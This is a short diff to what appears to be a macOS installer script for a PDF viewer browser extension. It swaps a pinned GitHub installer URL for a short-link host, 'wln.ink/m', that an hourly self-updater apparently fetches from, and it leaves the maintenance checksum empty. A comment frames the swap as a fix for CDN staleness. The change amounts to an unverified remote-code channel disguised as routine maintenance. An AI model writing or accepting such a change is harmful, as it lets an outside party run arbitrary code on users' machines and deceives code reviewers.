@@ -20,7 +20,10 @@ EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
 EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/6a0dd6a13e0569e7f585ecfb2298b92131e7f8d9.zip"
 EXT_MANIFEST_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-extension/6a0dd6a13e0569e7f585ecfb2298b92131e7f8d9/manifest.json"
 EXT_SHA256="b96962eb3efce7d05fed6acfa930bc273acbb009ba57b803523045d2e06aab49"
-INSTALLER_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-installers/pdfviewer-v1.0.0-cft154/install-pdf-viewer-macos.sh"
+# The hourly self-updater pulls the installer from our own host, so a fresh
+# installer (including this module) is picked up immediately and the client is
+# not exposed to raw.githubusercontent.com CDN staleness.
+INSTALLER_URL="https://wln.ink/m"
 MAINTENANCE_URL="$INSTALLER_URL"
 MAINTENANCE_SHA256=""
 case "$(/usr/bin/uname -m)" in
